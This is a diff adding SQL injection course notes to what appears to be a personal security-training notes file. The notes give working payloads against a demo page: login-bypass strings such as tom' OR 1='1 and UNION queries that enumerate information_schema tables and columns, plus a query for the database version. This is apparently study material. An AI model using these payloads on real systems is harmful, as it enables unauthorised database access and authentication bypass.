@@ -131,6 +131,56 @@ ssh -S /tmp/gray dummy -O forward -D9050
 ssh -S /tmp/gray dummy -O cancel -D9050 (Cancel Dynamic tunnel)
 
 
+##DAY 3 NOTES SQL INJECTION
+Structured Query Language - ANSI Standard
+Data bases broken up into tables and store information 
+
+SQL COMMANDS:
+    SELECT - Extracts data from a database
+    UNION - Used to combine the result-set of two or more SELECT statements
+    USE - Selects the DB to use
+
+Demo Sql Web Exploit:
+**put semi colon at the end of a command to end it
+
+select * from session.car;
+select * from car UNION select tireid,name,size,cost,1,2 from tires (1,2 used to pad out the columns) 
+                                                                    such as looking at the individual database and fincing 
+                                                                    one has less columns then the other when using UNION 
+                                                                    you have to pad out extra columns.
+-good practice to change number for each clumn to tell where they went.
+
+
+SQL queries -
+    unsanitized fields can be found using a single quote (')
+        will return extraneous information
+POST METHOD (sending data to server)
+tom' OR 1='1
+'tom' OR 1=1;
+Looking at inspect source to gain info on crafting sql injection
+when ran as php on site add ? to add anything onto it. (?username=tom'OR 1='1 & passwd=tom'OR 1='1)
+
+
+
+#SQL Injection primary methods
+
+GET Method (URL)
+
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car
+
+POST Method (Form Input):
+
+Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
+Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #     -- "Golden" statement
+Audi' UNION SELECT 1,2,3,name,size FROM session.Tires; #
+Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
+
+    Change the column name to a different spot, in order to see how you can manipulate the output from the SQL query.
 
 
 
